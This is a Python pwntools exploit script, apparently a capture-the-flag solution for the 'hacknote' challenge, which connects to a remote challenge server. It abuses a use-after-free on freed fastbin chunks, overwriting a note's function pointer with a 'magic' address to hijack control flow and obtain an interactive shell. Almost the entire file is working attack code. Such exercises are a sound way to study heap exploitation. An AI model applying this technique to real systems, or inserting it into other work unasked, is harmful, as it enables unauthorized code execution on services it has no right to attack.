#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'hacknote'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 26870

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('Your choice :', str(1))
	sla(':', str(size))
	sla(':', data)

def rm(idx):
	sla('Your choice :', str(2))
	sla(':', str(idx))

def dp(idx):
	sla('Your choice :', str(3))
	sla(':', str(idx))

def q():
	sla('Your choice :', str(4))	

#--------------------------Exploit--------------------------
def exploit():
	magic = 0x08048945
	ad(0x10, 'A') # for 0x10 fastbin -> chunk 2 0x10 fastbin
	# 0x10 ch0
	# 0x20 ch1
	ad(0x10, 'B')
	# 0x10 ch2
	# 0x20 ch3

	rm(0)
	rm(1)
	# 0x10 ch0 -> ch2
	# 0x20 ch1 -> ch3

	# chunk 
	p = p32(magic)
	ad(0x8, p) # we can control ch2
	# get shell
	dp(0)

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
